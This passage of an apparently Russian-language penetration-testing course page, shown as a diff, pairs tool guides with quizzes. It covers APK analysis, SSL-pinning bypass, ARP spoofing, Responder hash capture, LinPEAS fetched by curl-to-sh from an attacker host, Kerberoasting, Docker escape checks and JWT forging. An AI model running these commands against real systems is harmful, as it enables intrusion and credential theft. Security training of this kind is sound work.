+                        <br>— <i>Как пользоваться JADX-GUI:</i> Скачайте с <code>github.com/skylot/jadx</code>, откройте файл <code>app.apk</code>. Нажмите <code>Navigation -> Text Search</code> (<code>Ctrl+Shift+F</code>) и введите в поиск слова <code>api_key</code>, <code>Bearer</code>, <code>firebaseio.com</code>, <code>http://</code>. Проверьте <code>AndroidManifest.xml</code> на наличие незащищенных экранов с флагом <code>android:exported="true"</code>.
+                        <br>— <i>Как разобрать, пропатчить и подписать APK через Apktool:</i>
+                        <br><code>apktool d app.apk -o decoded_app</code> (разборка в Smali-код и ресурсы)
+                        <br><code>apktool b decoded_app -o patched.apk</code> (сборка обратно в APK)
+                        <br><code>uber-apk-signer -a patched.apk</code> (автоматическая криптографическая подпись для установки на смартфон).</li>
+                    <li><b>2. Frida & Objection</b> — фреймворки для динамического внедрения в работающее приложение в оперативной памяти (обход Root-детекта и SSL Pinning в один клик).
+                        <br>— <i>Установка на ПК:</i> <code>pip install frida-tools objection</code>.
+                        <br>— <i>Как пользоваться:</i> Подключите тестовый смартфон или эмулятор по <code>adb devices</code>. Чтобы автоматически обойти проверку сертификата (SSL Pinning) в приложении и перехватывать его HTTPS-трафик в Burp Suite, запустите:
+                        <br><code>objection -g com.example.app explore</code>
+                        <br>А внутри открывшейся консоли Objection введите команду: <code>android sslpinning disable</code> и <code>android root disable</code>.</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Мобильный пентест</h3>
+            <form id="form-mobile">
+                <p><b>1. В каком файле внутри APK-архива перечислены все запрашиваемые приложением разрешения и экспортируемые компоненты?</b></p>
+                <label><input type="radio" name="mobileQ1" value="1"> AndroidManifest.xml</label>
+                <label><input type="radio" name="mobileQ1" value="0"> autorun.inf</label>
+                <label><input type="radio" name="mobileQ1" value="2"> boot.ini</label>
+
+                <p><b>2. Какая программа позволяет в один клик декомпилировать файлы classes.dex внутри APK обратно в читаемый исходный код на языке Java?</b></p>
+                <label><input type="radio" name="mobileQ2" value="0"> Блокнот Windows</label>
+                <label><input type="radio" name="mobileQ2" value="1"> JADX (JADX-GUI)</label>
+                <label><input type="radio" name="mobileQ2" value="2"> Microsoft Paint</label>
+
+                <p><b>3. Что означает атрибут android:exported="true" у Activity или Service в манифесте приложения?</b></p>
+                <label><input type="radio" name="mobileQ3" value="1"> Этот компонент открыт для вызова другими приложениями, установленными на устройстве.</label>
+                <label><input type="radio" name="mobileQ3" value="0"> Приложение переведено на все языки мира.</label>
+                <label><input type="radio" name="mobileQ3" value="2"> Приложение не расходует заряд батареи.</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="opsec" class="hide">
+        <article class="card">
+            <h2>Анонимность, сетевая приватность и OPSEC</h2>
+            <p><b>OPSEC (Operational Security)</b> защищает исследователя от утечек реального IP-адреса через WebRTC/DNS, аппаратного отпечатка браузера (Canvas/WebGL Fingerprinting) и скрытых метаданных в публикуемых файлах и сетевых интерфейсах.</p>
+
+            <div class="dl-box">
+                <h4>Утилиты сетевой анонимизации и очистки цифрового следа (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Proxychains-ng + Tor</b> — утилита для принудительной маршрутизации любой консольной программы (Nmap, SQLMap, cURL, SSH) через цепочку прокси-серверов SOCKS5 или сеть Tor.
+                        <br>— <i>Установка:</i> <code>sudo apt install tor proxychains4</code>.
+                        <br>— <i>Как пользоваться:</i>
+                        <br>1. Запустите службу Tor в фоне: <code>sudo systemctl start tor</code> (она откроет локальный порт <code>127.0.0.1:9050</code>).
+                        <br>2. В файле <code>/etc/proxychains4.conf</code> раскомментируйте строку <code>dynamic_chain</code> и <code>proxy_dns</code> (защита от утечки DNS), а в самом низу проверьте наличие строки <code>socks5 127.0.0.1 9050</code>.
+                        <br>3. Запускайте любую утилиту с префиксом <code>proxychains</code>, например, проверьте свой внешний IP:
+                        <br><code>proxychains curl -s https://ifconfig.me</code></li>
+                    <li><b>2. MACChanger & MAT2 (Metadata Anonymisation Toolkit)</b> — смена аппаратного MAC-адреса сетевой карты и полная зачистка метаданных из документов.
+                        <br>— <i>Как сменить MAC-адрес перед подключением к публичному Wi-Fi:</i>
+                        <br><code>sudo ip link set wlan0 down && sudo macchanger -r wlan0 && sudo ip link set wlan0 up</code> (флаг <code>-r</code> генерирует случайный MAC-адрес).
+                        <br>— <i>Как очистить метаданные из PDF, DOCX, JPG и MP4 через MAT2:</i>
+                        <br>Просмотреть скрытые метаданные: <code>mat2 -s report.pdf</code>. Создать полностью очищенную копию файла: <code>mat2 report.pdf</code>.</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Анонимность и OPSEC</h3>
+            <form id="form-opsec">
+                <p><b>1. Какая браузерная технология для аудио/видеосвязи способна раскрыть реальный IP-адрес пользователя в обход прокси-расширений?</b></p>
+                <label><input type="radio" name="opsecQ1" value="1"> WebRTC</label>
+                <label><input type="radio" name="opsecQ1" value="0"> HTML Tables</label>
+                <label><input type="radio" name="opsecQ1" value="2"> CSS Grid</label>
+
+                <p><b>2. В чем заключается ключевая архитектурная особенность системы Whonix для защиты от утечки IP?</b></p>
+                <label><input type="radio" name="opsecQ2" value="0"> Она работает без использования процессора.</label>
+                <label><input type="radio" name="opsecQ2" value="1"> Разделение на две виртуальные машины: рабочая станция (Workstation) изолирована и выходит в сеть только через шлюз (Gateway).</label>
+                <label><input type="radio" name="opsecQ2" value="2"> Она удаляет жесткий диск каждые 5 минут.</label>
+
+                <p><b>3. Что такое Canvas Fingerprinting?</b></p>
+                <label><input type="radio" name="opsecQ3" value="1"> Метод идентификации устройства по уникальным особенностям отрисовки графики и шрифтов видеокартой и системой.</label>
+                <label><input type="radio" name="opsecQ3" value="0"> Сканер отпечатка пальца на кнопке включения ноутбука.</label>
+                <label><input type="radio" name="opsecQ3" value="2"> Фотографирование экрана монитора на камеру.</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="mitm" class="hide">
+        <article class="card">
+            <h2>Сетевые атаки в локальной сети (MITM, ARP-Spoofing, Responder)</h2>
+            <p>Внутри локальной подсети устройства находят друг друга по физическим MAC-адресам через протокол <b>ARP</b> и широковещательные запросы <b>LLMNR / mDNS</b>. Поскольку в этих протоколах нет криптографической проверки подлинности, узел в той же сети может перехватить трафик или сетевые хеши аутентификации.</p>
+
+            <div class="ascii-diagram">[Устройство жертвы] ──(Трафик)──► [Узел анализа (ARP-Spoof)] ──(Пересылка)──► [Шлюз 192.168.1.1]</div>
+
+            <div class="dl-box">
+                <h4>Инструменты аудита локальных сетей (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Bettercap</b> — современный швейцарский нож для анализа локальных сетей (ARP-spoofing, DNS-spoofing, сниффинг пакетов и аудит BLE/Wi-Fi).
+                        <br>— <i>Установка:</i> <code>sudo apt install bettercap</code>.
+                        <br>— <i>Как пользоваться на лабораторном стенде:</i>
+                        <br>1. Запустите интерактивную консоль: <code>sudo bettercap -iface eth0</code>
+                        <br>2. Включите обнаружение всех устройств в локальной сети: <code>net.probe on</code> и посмотрите таблицу: <code>net.show</code>
+                        <br>3. Задайте целевую виртуальную машину и запустите перехват:
+                        <br><code>set arp.spoof.fullduplex true</code> -> <code>set arp.spoof.targets 192.168.1.15</code> -> <code>arp.spoof on</code> -> <code>net.sniff on</code>.</li>
+                    <li><b>2. Responder</b> — специализированный инструмент для проверки корпоративных сетей на уязвимость к отравлению широковещательных протоколов LLMNR, NBT-NS и mDNS.
+                        <br>— <i>Установка:</i> <code>sudo apt install responder</code>.
+                        <br>— <i>Как пользоваться:</i>
+                        <br>• Сначала запустите в пассивном режиме анализа (без вмешательства в сеть), чтобы увидеть широковещательные запросы: <code>sudo responder -I eth0 -A</code>
+                        <br>• В активном лабораторном режиме (<code>sudo responder -I eth0 -wFv</code>) при обращении тестовой машины к несуществующей сетевой папке Responder перехватывает хеш <b>NTLMv2</b> и сохраняет его в папку <code>/usr/share/responder/logs/</code> для последующего аудита в Hashcat (мод <code>-m 5600</code>).</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: MITM и локальные сети</h3>
+            <form id="form-mitm">
+                <p><b>1. Какой фундаментальный недостаток протокола ARP делает возможной атаку ARP-Spoofing?</b></p>
+                <label><input type="radio" name="mitmQ1" value="1"> Отсутствие какой-либо криптографической проверки подлинности ARP-ответов (устройства верят любому пришедшему пакету).</label>
+                <label><input type="radio" name="mitmQ1" value="0"> Протокол работает только на скорости 1 байт в час.</label>
+                <label><input type="radio" name="mitmQ1" value="2"> Он требует ввода пароля каждые 10 секунд.</label>
+
+                <p><b>2. Какой главный признак в выводе команды arp -a указывает на то, что в вашей сети запущен ARP-спуфинг?</b></p>
+                <label><input type="radio" name="mitmQ2" value="0"> Отсутствие подключения к принтеру.</label>
+                <label><input type="radio" name="mitmQ2" value="1"> У IP-адреса роутера и у еще одного чужого IP-адреса в подсети отображается абсолютно одинаковый MAC-адрес.</label>
+                <label><input type="radio" name="mitmQ2" value="2"> Название сети написано заглавными буквами.</label>
+
+                <p><b>3. Какая настройка на Wi-Fi роутере запрещает подключенным клиентам общаться друг с другом напрямую и проводить MITM-атаки?</b></p>
+                <label><input type="radio" name="mitmQ3" value="1"> AP Isolation (Client Isolation / Изоляция клиентов)</label>
+                <label><input type="radio" name="mitmQ3" value="0"> UPnP</label>
+                <label><input type="radio" name="mitmQ3" value="2"> Port Forwarding</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="privesc" class="hide">
+        <article class="card">
+            <h2>Безопасность Linux и повышение привилегий (Privilege Escalation)</h2>
+            <p>После получения первичного доступа под сервисным пользователем (например, <code>www-data</code>) проводится аудит конфигурации ОС на ошибки прав доступа: небезопасные правила <code>sudo -l</code>, бинарники с флагом <b>SUID</b>, Linux Capabilities и фоновые задания <code>cron</code>.</p>
+
+            <div class="dl-box">
+                <h4>Инструменты автоматизации Linux PrivEsc (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. LinPEAS (Linux Privilege Escalation Awesome Script)</b> — самый полный скрипт автоматического поиска векторов повышения привилегий в Linux.
+                        <br>— <i>Как доставить и запустить на тестируемой машине:</i>
+                        <br>1. На своей машине запустите локальный веб-сервер в папке со скриптом: <code>python3 -m http.server 8000</code>
+                        <br>2. На тестируемой Linux-машине скачайте и сразу выполните скрипт в оперативной памяти с сохранением отчета:
+                        <br><code>curl -L http://10.10.14.2:8000/linpeas.sh | sh | tee linpeas_out.txt</code>
+                        <br>3. Обращайте первоочередное внимание на строки, выделенные <b>красным на желтом фоне (95% вектор PrivEsc)</b>: забытые пароли в конфигах, уязвимые SUID-файлы и права на редактирование системных служб.</li>
+                    <li><b>2. pspy (Process Snooping without Root)</b> — легкая утилита на Go, которая позволяет обычному бесправному пользователю видеть все процессы и скрытые задачи <code>cron</code>, которые запускаются в системе от имени <code>root</code> в реальном времени.
+                        <br>— <i>Как пользоваться:</i> Скачайте бинарник <code>pspy64</code> с GitHub (<code>DominicBreuker/pspy</code>), выдайте права на запуск и запустите мониторинг:
+                        <br><code>chmod +x pspy64 && ./pspy64 -pf -i 1000</code>
+                        <br>— Подождите 1–2 минуты: вы увидите команды с <code>UID=0</code> (root), которые запускаются по таймеру (например, <code>/bin/sh -c /opt/cleanup.sh</code>), даже если сам файл <code>/etc/crontab</code> закрыт от чтения.</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Повышение привилегий (Linux)</h3>
+            <form id="form-privesc">
+                <p><b>1. Какая команда в Linux позволяет проверить, какие программы текущему пользователю разрешено запускать с правами суперпользователя через sudo?</b></p>
+                <label><input type="radio" name="privescQ1" value="1"> sudo -l</label>
+                <label><input type="radio" name="privescQ1" value="0"> clear</label>
+                <label><input type="radio" name="privescQ1" value="2"> echo hello</label>
+
+                <p><b>2. Что делает специальный флаг прав доступа SUID на исполняемом файле, владельцем которого является root?</b></p>
+                <label><input type="radio" name="privescQ2" value="0"> Удаляет файл сразу после первого запуска.</label>
+                <label><input type="radio" name="privescQ2" value="1"> Позволяет любому пользователю запускать этот файл с эффективными правами его владельца (root).</label>
+                <label><input type="radio" name="privescQ2" value="2"> Запрещает чтение файла по вторникам.</label>
+
+                <p><b>3. Как называется открытая база знаний со списками стандартных Linux-утилит, которые позволяют получить root-шелл при неправильной настройке sudo или SUID?</b></p>
+                <label><input type="radio" name="privescQ3" value="1"> GTFOBins</label>
+                <label><input type="radio" name="privescQ3" value="0"> Wikipedia</label>
+                <label><input type="radio" name="privescQ3" value="2"> WinRAR</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="stego" class="hide">
+        <article class="card">
+            <h2>Стеганография и цифровая криминалистика (Forensics)</h2>
+            <p><b>Стеганография</b> скрывает сам факт наличия тайных данных внутри обычных изображений (метод замены младших значащих бит — <b>LSB</b>) или аудиофайлов, а <b>цифровая форензика</b> занимается восстановлением удаленных объектов и анализом дампов оперативной памяти.</p>
+
+            <div class="dl-box">
+                <h4>Инструменты стегоанализа и форензики (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Binwalk & Foremost</b> — утилиты для поиска и автоматического вырезания («карвинга») файлов и архивов, спрятанных внутри других файлов или прошивок роутеров.
+                        <br>— <i>Установка:</i> <code>sudo apt install binwalk foremost</code>.
+                        <br>— <i>Как пользоваться:</i>
+                        <br>• Просканировать картинку на наличие склеенных внутри архивов: <code>binwalk picture.jpg</code>
+                        <br>• Автоматически извлечь и распаковать все найденные внутри файлы в папку <code>_picture.jpg.extracted</code>: <code>binwalk -e -M picture.jpg</code></li>
+                    <li><b>2. Steghide, Stegseek & Zsteg</b> — утилиты для извлечения данных из LSB-слоев JPEG, WAV, PNG и BMP.
+                        <br>— <i>Извлечь данные из JPG/WAV через Steghide:</i> <code>steghide extract -sf image.jpg</code> (если пароль неизвестен, запустите сверхбыстрый переборщик <b>Stegseek</b>: <code>stegseek image.jpg /usr/share/wordlists/rockyou.txt</code> — он проверяет весь словарь за 2 секунды).
+                        <br>— <i>Проверить все битовые каналы PNG/BMP через Zsteg:</i> <code>zsteg -a mystery.png</code></li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Стеганография и форензика</h3>
+            <form id="form-stego">
+                <p><b>1. Чем стеганография принципиально отличается от криптографии?</b></p>
+                <label><input type="radio" name="stegoQ1" value="1"> Криптография скрывает смысл сообщения, а стеганография скрывает сам факт его существования внутри другого файла.</label>
+                <label><input type="radio" name="stegoQ1" value="0"> Стеганография работает только на бумаге.</label>
+                <label><input type="radio" name="stegoQ1" value="2"> Это абсолютно одно и то же слово.</label>
+
+                <p><b>2. Какая консольная утилита позволяет обнаружить и автоматически извлечь ZIP-архив, склеенный с обычной JPEG-картинкой?</b></p>
+                <label><input type="radio" name="stegoQ2" value="0"> ping</label>
+                <label><input type="radio" name="stegoQ2" value="1"> binwalk (с флагом -e)</label>
+                <label><input type="radio" name="stegoQ2" value="2"> calc.exe</label>
+
+                <p><b>3. Как расшифровывается аббревиатура метода LSB, при котором биты секретного сообщения записываются в последние биты цветовых каналов пикселей?</b></p>
+                <label><input type="radio" name="stegoQ3" value="1"> Least Significant Bit (Наименьший значащий бит)</label>
+                <label><input type="radio" name="stegoQ3" value="0"> Local System Bus</label>
+                <label><input type="radio" name="stegoQ3" value="2"> Large Screen Brightness</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="fuzzing" class="hide">
+        <article class="card">
+            <h2>Веб-фаззинг и поиск скрытых директорий (Gobuster & ffuf)</h2>
+            <p>На большинстве сайтов самые интересные разделы — панели администратора (<code>/admin</code>), забытые архивы исходного кода (<code>/backup.zip</code>), конфигурационные файлы (<code>/.env</code>, <code>/.git/config</code>) и тестовые API-эндпоинты — нигде не опубликованы в меню. <b>Веб-фаззинг (Fuzzing)</b> — это скоростная автоматическая подстановка тысяч слов из словарей (например, пакета <b>SecLists</b>) в URL, заголовки или параметры запроса с фильтрацией ответов сервера по HTTP-коду (<code>200 OK</code>, <code>301</code>, <code>403</code>) и размеру страницы.</p>
+
+            <div class="ascii-diagram">[Словарь SecLists] ──► [Фаззер ffuf / Gobuster (FUZZ)] ──► [Фильтр HTTP 200 / 301 / 403] ──► [Найдена скрытая панель /admin]</div>
+
+            <div class="dl-box">
+                <h4>Главные инструменты веб-фаззинга (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. ffuf (Fuzz Faster U Fool)</b> — самый гибкий и быстрый веб-фаззер на языке Go. Позволяет подставлять ключевое слово <code>FUZZ</code> в любое место URL, HTTP-заголовков или POST-данных.
+                        <br>— <i>Установка:</i> <code>sudo apt install ffuf seclists</code>
+                        <br>— <i>Полный гайд по основным сценариям:</i>
+                        <br>• Поиск скрытых папок и файлов (с расширениями <code>.php</code>, <code>.bak</code>, <code>.txt</code>):
+                        <br><code>ffuf -u http://site.local/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.bak,.txt -mc 200,301,403</code>
+                        <br>• Поиск скрытых виртуальных хостов (поддоменов на одном IP) через заголовок <code>Host</code> с фильтрацией стандартного размера ответа (<code>-fs 4242</code>):
+                        <br><code>ffuf -u http://site.local/ -H "Host: FUZZ.site.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 4242</code>
+                        <br>• Фаззинг неизвестных GET-параметров страницы:
+                        <br><code>ffuf -u "http://site.local/profile.php?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fw 120</code></li>
+                    <li><b>2. Gobuster</b> — надежный многопоточный сканер директорий, DNS-поддоменов и S3-бакетов.
+                        <br>— <i>Установка:</i> <code>sudo apt install gobuster</code>
+                        <br>— <i>Как пользоваться:</i>
+                        <br>• Режим перебора директорий (<code>dir</code>) в 50 потоков:
+                        <br><code>gobuster dir -u http://site.local/ -w /usr/share/wordlists/dirb/common.txt -x php,html,zip -t 50</code>
+                        <br>• Режим перебора DNS-поддоменов (<code>dns</code>):
+                        <br><code>gobuster dns -d site.local -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50</code></li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Веб-фаззинг</h3>
+            <form id="form-fuzzing">
+                <p><b>1. Какое ключевое слово-маркер используется в утилите ffuf для указания места, куда нужно подставлять слова из словаря?</b></p>
+                <label><input type="radio" name="fuzzingQ1" value="1"> FUZZ</label>
+                <label><input type="radio" name="fuzzingQ1" value="0"> CLICK_HERE</label>
+                <label><input type="radio" name="fuzzingQ1" value="2"> DELETE</label>
+
+                <p><b>2. Зачем при фаззинге виртуальных хостов (VHosts) в ffuf используют флаг фильтрации по размеру ответа (-fs)?</b></p>
+                <label><input type="radio" name="fuzzingQ2" value="0"> Чтобы уменьшить яркость монитора.</label>
+                <label><input type="radio" name="fuzzingQ2" value="1"> Чтобы скрыть тысячи одинаковых стандартных страниц-заглушек и оставить только уникальные ответы найденных поддоменов.</label>
+                <label><input type="radio" name="fuzzingQ2" value="2"> Чтобы отформатировать флешку.</label>
+
+                <p><b>3. Как называется самый известный открытый репозиторий словарей для фаззинга директорий, параметров и паролей?</b></p>
+                <label><input type="radio" name="fuzzingQ3" value="1"> SecLists</label>
+                <label><input type="radio" name="fuzzingQ3" value="0"> WordPad</label>
+                <label><input type="radio" name="fuzzingQ3" value="2"> DirectX</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="ad" class="hide">
+        <article class="card">
+            <h2>Аудит корпоративных сетей Windows и Active Directory</h2>
+            <p>Более 90% крупных компаний управляют компьютерами и правами сотрудников через службу каталогов <b>Microsoft Active Directory (AD)</b>. Безопасность домена строится на протоколах аутентификации <b>Kerberos</b> и <b>NTLM</b>, а также списках контроля доступа (ACL). Классические атаки на AD включают <b>Kerberoasting</b> (запрос сервисных билетов TGS для офлайн-перебора пароля сервисной учетки), <b>AS-REP Roasting</b> и построение графов путей до группы <code>Domain Admins</code>.</p>
+
+            <div class="ascii-diagram">[Пользователь домена] ──► [Сбор графа BloodHound / Kerberoasting] ──► [Анализ прав ACL] ──► [Domain Admin (Контроллер домена)]</div>
+
+            <div class="dl-box">
+                <h4>Инструменты аудита Active Directory (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. BloodHound & SharpHound / BloodHound-Python</b> — графическая система анализа скрытых связей, сессий и разрешений внутри домена Active Directory на базе графовой СУБД Neo4j.
+                        <br>— <i>Установка:</i> <code>sudo apt install bloodhound neo4j python3-bloodhound</code>
+                        <br>— <i>Пошаговый гайд:</i>
+                        <br>1. Соберите данные о пользователях, группах и сессиях с контроллера домена удаленно с помощью коллектора <code>bloodhound-python</code>:
+                        <br><code>bloodhound-python -u 'user' -p 'Password123' -d corp.local -ns 10.10.10.100 -c All</code>
+                        <br>2. Запустите базу данных: <code>sudo neo4j console</code> и откройте интерфейс <code>bloodhound</code>.
+                        <br>3. Перетащите собранные <code>.json</code> файлы в окно BloodHound и во вкладке <b>Analysis</b> выберите готовый запрос <i>«Find Shortest Paths to Domain Admins»</i> — программа нарисует точную схему шагов до прав администратора домена.</li>
+                    <li><b>2. NetExec (бывший CrackMapExec) & Пакет Impacket</b> — швейцарские ножи для работы с протоколами SMB, WinRM, LDAP и Kerberos.
+                        <br>— <i>Как пользоваться NetExec (nxc):</i>
+                        <br>• Проверить доступность SMB-шар и валидность учетных данных по всей подсети:
+                        <br><code>nxc smb 10.10.10.0/24 -u 'user' -p 'Password123' --shares</code>
+                        <br>— <i>Как выполнить атаку Kerberoasting через Impacket:</i>
+                        <br><code>impacket-GetUserSPNs corp.local/user:Password123 -dc-ip 10.10.10.100 -request -outputfile tgs_hashes.txt</code> (полученные хеши проверяются в Hashcat с модом <code>-m 13100</code>).</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Active Directory</h3>
+            <form id="form-ad">
+                <p><b>1. Для чего при аудите Active Directory используется инструмент BloodHound?</b></p>
+                <label><input type="radio" name="adQ1" value="1"> Для визуализации графа прав доступа, групп и поиска кратчайшего пути повышения привилегий до администратора домена.</label>
+                <label><input type="radio" name="adQ1" value="0"> Для редактирования фотографий сотрудников.</label>
+                <label><input type="radio" name="adQ1" value="2"> Для измерения температуры в серверной комнате.</label>
+
+                <p><b>2. В чем заключается суть техники Kerberoasting?</b></p>
+                <label><input type="radio" name="adQ2" value="0"> Физическое отключение кабеля от контроллера домена.</label>
+                <label><input type="radio" name="adQ2" value="1"> Запрос сервисных билетов Kerberos (TGS), зашифрованных хешем пароля сервисной учетной записи, с целью последующего офлайн-перебора этого пароля.</label>
+                <label><input type="radio" name="adQ2" value="2"> Установка браузера Chrome на все компьютеры.</label>
+
+                <p><b>3. Какая консольная утилита (преемник CrackMapExec) используется для быстрой проверки учетных данных и обхода хостов по протоколам SMB, WinRM и LDAP?</b></p>
+                <label><input type="radio" name="adQ3" value="1"> NetExec (nxc)</label>
+                <label><input type="radio" name="adQ3" value="0"> Paint.exe</label>
+                <label><input type="radio" name="adQ3" value="2"> Winamp</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="docker" class="hide">
+        <article class="card">
+            <h2>Безопасность контейнеров Docker и побег из контейнера (Container Escape)</h2>
+            <p>Контейнеры <b>Docker</b> изолируют процессы с помощью пространств имен ядра Linux (<b>Namespaces</b>) и ограничений ресурсов (<b>cgroups</b>), но делят одно общее ядро ОС с хост-машиной. Если контейнер запущен с опасным флагом <code>--privileged</code>, или внутрь него проброшен управляющий сокет <code>/var/run/docker.sock</code>, злоумышленник может совершить побег из контейнера (<b>Container Escape</b>) и получить права <code>root</code> на основном физическом сервере.</p>
+
+            <div class="ascii-diagram">[Внутри контейнера] ──► [Доступ к /var/run/docker.sock или --privileged] ──► [Монтирование диска хоста /dev/sda1] ──► [Root на хосте]</div>
+
+            <div class="dl-box">
+                <h4>Инструменты аудита безопасности Docker (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Trivy (от Aqua Security)</b> — всесторонний сканер образов контейнеров, файловых систем и конфигураций Kubernetes на известные CVE-уязвимости и случайно забытые секреты.
+                        <br>— <i>Установка:</i> <code>sudo apt install trivy</code> (или через оф. репозиторий Aqua Security).
+                        <br>— <i>Как пользоваться:</i>
+                        <br>• Проверить Docker-образ перед запуском на критические и высокие уязвимости:
+                        <br><code>trivy image --severity HIGH,CRITICAL nginx:1.18</code>
+                        <br>• Просканировать папку своего проекта (включая <code>Dockerfile</code> и зависимости Python/Node.js) на забытые ключи и ошибки конфигурации:
+                        <br><code>trivy fs --scanners vuln,secret,misconfig ./my_project/</code></li>
+                    <li><b>2. Deepce (Docker Enumeration, Escalation of Privileges and Container Escape)</b> — специализированный скрипт для проверки окружения внутри контейнера и поиска путей побега на хост.
+                        <br>— <i>Как пользоваться:</i>
+                        <br>• Скачайте скрипт с <code>github.com/stealthcopter/deepce</code> внутрь тестируемого контейнера и запустите:
+                        <br><code>chmod +x deepce.sh && ./deepce.sh</code>
+                        <br>• Скрипт автоматически проверит: находитесь ли вы в контейнере, доступен ли сокет <code>docker.sock</code>, включен ли режим <code>--privileged</code> и какие опасные Linux Capabilities (например, <code>CAP_SYS_ADMIN</code>) выданы процессу.</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Безопасность Docker</h3>
+            <form id="form-docker">
+                <p><b>1. Почему проброс файла /var/run/docker.sock внутрь контейнера считается критической угрозой безопасности?</b></p>
+                <label><input type="radio" name="dockerQ1" value="1"> Он дает полный доступ к API демона Docker на хосте, позволяя запустить новый контейнер с примонтированным корневым диском основного сервера.</label>
+                <label><input type="radio" name="dockerQ1" value="0"> Он отключает звуковую карту сервера.</label>
+                <label><input type="radio" name="dockerQ1" value="2"> Он меняет обои рабочего стола.</label>
+
+                <p><b>2. Какой флаг запуска контейнера Docker снимает практически все ограничения изоляции и дает контейнеру прямой доступ к устройствам хоста (/dev/*)?</b></p>
+                <label><input type="radio" name="dockerQ2" value="0"> --read-only</label>
+                <label><input type="radio" name="dockerQ2" value="1"> --privileged</label>
+                <label><input type="radio" name="dockerQ2" value="2"> --help</label>
+
+                <p><b>3. Какая утилита является отраслевым стандартом для автоматического сканирования Docker-образов на уязвимые пакеты (CVE) и забытые секреты?</b></p>
+                <label><input type="radio" name="dockerQ3" value="1"> Trivy</label>
+                <label><input type="radio" name="dockerQ3" value="0"> Notepad</label>
+                <label><input type="radio" name="dockerQ3" value="2"> Minesweeper</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="api" class="hide">
+        <article class="card">
+            <h2>Пентест REST/GraphQL API и безопасность JWT-токенов</h2>
+            <p>Современные веб- и мобильные приложения общаются с бэкендом через <b>REST API</b> или <b>GraphQL</b>, используя для авторизации <b>JWT (JSON Web Token)</b>. JWT состоит из трех частей в кодировке Base64Url, разделенных точками: <code>Header.Payload.Signature</code>. Типичные уязвимости API (по списку <b>OWASP API Security Top 10</b>) включают: <b>BOLA/IDOR</b> (доступ к чужим объектам), <b>Mass Assignment</b> (передача лишних полей вроде <code>"role":"admin"</code> при регистрации) и ошибки проверки подписи JWT (прием алгоритма <code>"alg": "none"</code> или слабый секретный ключ <code>HMAC-SHA256</code>).</p>
+
+            <div class="ascii-diagram">[JWT: Header (Алгоритм)] . [Payload (user_id, role)] . [Signature (Криптоподпись сервера)]</div>
+
+            <div class="dl-box">
+                <h4>Инструменты тестирования API и аудита JWT (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. jwt_tool</b> — главный консольный набор для декодирования, модификации, проверки уязвимостей и брутфорса секретных ключей JWT-токенов.
+                        <br>— <i>Установка:</i> <code>git clone https://github.com/ticarpi/jwt_tool && pip install -r jwt_tool/requirements.txt</code>
+                        <br>— <i>Пошаговый гайд:</i>
+                        <br>• Расшифровать и изучить все поля токена: <code>python3 jwt_tool.py &lt;ВАШ_JWT_ТОКЕН&gt;</code>
+                        <br>• Проверить токен на обход подписи через уязвимость <code>alg: none</code>: <code>python3 jwt_tool.py &lt;JWT&gt; -X a</code>
+                        <br>• Подобрать слабый секретный ключ подписи <code>HS256</code> по словарю:
+                        <br><code>python3 jwt_tool.py &lt;JWT&gt; -C -d /usr/share/wordlists/rockyou.txt</code>
+                        <br>• Подделать полезную нагрузку (например, сменить роль на <code>admin</code>) и подписать найденным ключом:
+                        <br><code>python3 jwt_tool.py &lt;JWT&gt; -I -pc role -pv admin -S hs256 -p "found_secret"</code></li>
+                    <li><b>2. Kiterunner (kr) & Postman</b> — обнаружение скрытых маршрутов API и интерактивное тестирование запросов.
+                        <br>— <i>Как пользоваться Kiterunner:</i> В отличие от обычных фаззеров, Kiterunner знает структуру REST-методов (<code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>DELETE</code>) и заголовков современных фреймворков:
+                        <br><code>kr scan http://site.local/api/ -w routes-large.kite</code>
+                        <br>— <i>Проверка GraphQL интроспекции в Postman:</i> Отправьте POST-запрос на <code>/graphql</code> с телом <code>{"query": "{__schema{types{name,fields{name}}}}"}</code> — если интроспекция не отключена разработчиком, сервер сам вернет полную схему всех существующих запросов и мутаций базы данных.</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Пентест API и JWT</h3>
+            <form id="form-api">
+                <p><b>1. Из каких трех частей, разделенных точками, состоит стандартный JWT-токен?</b></p>
